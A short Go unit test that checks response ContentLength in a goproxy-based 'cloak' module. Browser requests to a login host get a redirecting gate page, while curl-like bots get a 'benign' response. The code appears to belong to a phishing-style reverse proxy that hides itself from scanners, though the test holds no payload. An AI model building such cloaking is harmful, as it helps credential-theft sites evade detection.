package core

import (
	"io"
	"net/http/httptest"
	"testing"
)

// TestResponseContentLengthSet: every hand-built goproxy response MUST set
// ContentLength. goproxy serializes with resp.Write(), which writes ZERO body
// bytes when ContentLength == 0 — the browser gets a bodyless page and the
// gate never redirects (the "stuck on page" bug).
func TestResponseContentLengthSet(t *testing.T) {
	InitCloak(nil)
	c := GetCloak()

	req := httptest.NewRequest("GET", "https://login.example.com/x", nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 Chrome/120")

	// gate page
	resp := c.GateCheck("192.0.2.50", req)
	if resp == nil {
		t.Fatal("gate should return a page")
	}
	if resp.ContentLength <= 0 {
		t.Errorf("gate page ContentLength = %d, must be > 0", resp.ContentLength)
	}
	body, _ := io.ReadAll(resp.Body)
	if int64(len(body)) != resp.ContentLength {
		t.Errorf("gate page body (%d bytes) != ContentLength (%d)", len(body), resp.ContentLength)
	}

	// benign response (bot path)
	breq := httptest.NewRequest("GET", "https://login.example.com/y", nil)
	breq.Header.Set("User-Agent", "curl/8.5.0")
	bresp := c.ServeBenignResponse(breq)
	if bresp.ContentLength <= 0 {
		t.Errorf("benign response ContentLength = %d, must be > 0", bresp.ContentLength)
	}
	bbody, _ := io.ReadAll(bresp.Body)
	if int64(len(bbody)) != bresp.ContentLength {
		t.Errorf("benign body (%d bytes) != ContentLength (%d)", len(bbody), bresp.ContentLength)
	}
}
